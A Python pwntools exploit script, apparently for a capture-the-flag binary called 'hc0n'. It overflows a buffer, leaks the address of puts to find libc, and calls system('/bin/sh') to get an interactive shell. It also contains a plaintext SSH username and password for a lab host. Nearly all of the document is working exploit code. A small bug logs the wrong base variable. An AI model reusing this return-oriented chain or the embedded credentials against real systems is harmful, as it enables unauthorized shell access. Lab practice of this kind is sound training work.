#!/usr/bin/env python3
from pwn import *

#thedarktangent / Gf7MRr55n$@#PDuliL
s=ssh(host='10.10.22.159',user='thedarktangent',password='Gf7MRr55n$@#PDuliL',port=22)

# Set up pwntools for the correct architecture
exe = './hc0n'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
libc = ELF('./libc-2.23.so')
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = process(exe)

#payload formulation
offset = b'A'*56 #found manually with gdb gef

payload = offset

payload += p64(rop.rdi[0]) #Popping the $RDI register for our argument
payload += p64(elf.got.puts) #putting address of puts in $RDI taken from global offset table
payload += p64(elf.plt.puts) #Executing the puts function with loaded argument
payload += p64(elf.symbols.main) #Returning to the main program with already leaked function


#finding our leak

io.sendlineafter('(: \n\n', payload) #send payload

leak = u64(io.recvline().strip().ljust(8,b'\0')) #address(correct one I think)


#rebasing libc using our calculated base address
log.info(f'Gets leak => {hex(leak)}') #info leak
libc_base = leak - libc.sym['puts'] #calculating our base address with leaked address
log.info(f'Libc base => {hex(libc.address)}') #info libc base

#getting a shell, most of the stuff is same from the previous rop chain

payload = offset
payload += p64(rop.find_gadget(['ret'])[0]) #Ret instruction is for the stack alignment
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(libc_base + next(libc.search(b'/bin/sh'))) #filling $RDI with byte string "/bin/sh"
payload += p64(libc_base + libc.symbols.system) #executing system function with loaded argument
payload += p64(rop.find_gadget(['ret'])[0]) #Ret instruction is for the stack alignment

#sending payload, again copied mostly from previous one
io.sendlineafter('(: \n\n',payload)

# Receive the flag
io.interactive()